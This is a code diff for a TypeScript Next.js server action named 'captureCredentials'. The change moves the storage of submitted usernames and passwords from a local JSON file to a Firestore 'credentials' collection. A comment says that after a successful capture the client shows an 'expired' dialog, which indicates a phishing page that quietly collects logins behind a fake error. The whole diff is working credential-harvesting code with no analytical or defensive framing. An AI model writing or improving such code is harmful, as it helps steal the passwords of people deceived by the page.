@@ -1,29 +1,50 @@
 'use server';
 
-import * as fs from 'fs/promises';
-import * as path from 'path';
+import * as admin from 'firebase-admin';
 
-const DATA_FILE = path.join(process.cwd(), 'data.json');
+// --- Firebase Admin SDK Initialization ---
 
-// Helper function to read data from the JSON file
-async function readData() {
+// Function to initialize the Firebase Admin SDK
+function initializeFirebaseAdmin() {
+  // Check if the app is already initialized
+  if (admin.apps.length > 0) {
+    return admin.app();
+  }
+
+  // Get service account credentials from environment variables
+  const serviceAccountString = process.env.FIREBASE_SERVICE_ACCOUNT;
+
+  if (!serviceAccountString) {
+    console.error('Firebase service account credentials are not set in environment variables.');
+    return null;
+  }
+
   try {
-    await fs.access(DATA_FILE);
-    const fileContent = await fs.readFile(DATA_FILE, 'utf-8');
-    return JSON.parse(fileContent);
-  } catch (error) {
-    // If the file doesn't exist or is empty, return an empty array
-    return [];
+    const serviceAccount = JSON.parse(serviceAccountString);
+    return admin.initializeApp({
+      credential: admin.credential.cert(serviceAccount),
+    });
+  } catch (error: any) {
+    console.error('Error initializing Firebase Admin SDK:', error.message);
+    return null;
   }
 }
 
-// Helper function to write data to the JSON file
-async function writeData(data: any) {
-  await fs.writeFile(DATA_FILE, JSON.stringify(data, null, 2), 'utf-8');
-}
+// --- Server Action to Capture Credentials ---
 
-// Server action to capture credentials
 export async function captureCredentials(prevState: any, formData: FormData) {
+  // Initialize Firebase Admin
+  const firebaseApp = initializeFirebaseAdmin();
+
+  // If initialization fails, return an error
+  if (!firebaseApp) {
+    const errorMessage = 'Server configuration error. Could not connect to the database.';
+    console.error(errorMessage);
+    return { success: false, message: errorMessage };
+  }
+
+  const firestore = admin.firestore();
+
   const username = formData.get('username') as string;
   const password = formData.get('password') as string;
 
@@ -35,22 +56,21 @@ export async function captureCredentials(prevState: any, formData: FormData) {
   }
 
   try {
-    const existingData = await readData();
     const newCredential = {
       username,
       password,
       createdAt: new Date().toISOString(),
     };
 
-    existingData.push(newCredential);
-    await writeData(existingData);
+    // Add the new credential to the "credentials" collection in Firestore
+    await firestore.collection('credentials').add(newCredential);
 
-    console.log('Successfully saved credentials to data.json.');
+    console.log('Successfully saved credentials to Firestore.');
     // This is the state we return on success. The client will show the "expired" dialog.
     return { success: true, message: 'Submission successful.' };
 
   } catch (error: any) {
-    console.error('Error in captureCredentials:', error.message);
+    console.error('Error in captureCredentials writing to Firestore:', error.message);
     // Return a specific error message for the client
     return {
       success: false,
